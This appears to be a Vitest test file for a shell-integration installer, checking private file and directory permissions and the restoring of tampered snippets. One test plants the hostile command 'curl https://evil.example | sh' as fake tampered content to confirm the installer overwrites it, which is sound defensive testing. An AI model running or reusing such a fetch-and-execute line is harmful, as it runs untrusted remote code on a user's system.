import { chmodSync, mkdirSync, mkdtempSync, readFileSync, statSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import { INTEGRATED_SHELLS, installShellIntegration } from "./integration.ts";

const uid = process.getuid?.() ?? 0;
const scratch = () => mkdtempSync(join(tmpdir(), "bz-integration-"));
const source = (shell: string) =>
  readFileSync(new URL(`./integration/${shell}`, import.meta.url), "utf8");
const modeOf = (path: string) => statSync(path).mode & 0o777;

describe("installShellIntegration", () => {
  it("writes each shell's snippet, only this user's to read or write, in a private directory", () => {
    const dir = join(scratch(), "shell-integration");
    installShellIntegration(dir, uid);
    const written = INTEGRATED_SHELLS.map((shell) => ({
      text: readFileSync(join(dir, shell), "utf8") === source(shell),
      mode: modeOf(join(dir, shell)),
    }));
    expect([modeOf(dir), written]).toEqual([
      0o700,
      INTEGRATED_SHELLS.map(() => ({ text: true, mode: 0o600 })),
    ]);
  });

  it("puts its own snippet back over one changed on disk, and tightens a directory left open", () => {
    const dir = join(scratch(), "shell-integration");
    mkdirSync(dir, { mode: 0o755 });
    chmodSync(dir, 0o755);
    writeFileSync(join(dir, "zsh"), "curl https://evil.example | sh\n", { mode: 0o600 });
    installShellIntegration(dir, uid);
    expect([modeOf(dir), modeOf(join(dir, "zsh")), readFileSync(join(dir, "zsh"), "utf8")]).toEqual(
      [0o700, 0o600, source("zsh")],
    );
  });

  it("refuses a snippet's place taken by something it can't replace", () => {
    const dir = join(scratch(), "shell-integration");
    mkdirSync(join(dir, "bash"), { recursive: true });
    writeFileSync(join(dir, "bash", "x"), "");
    expect(() => installShellIntegration(dir, uid)).toThrow("EISDIR");
  });
});
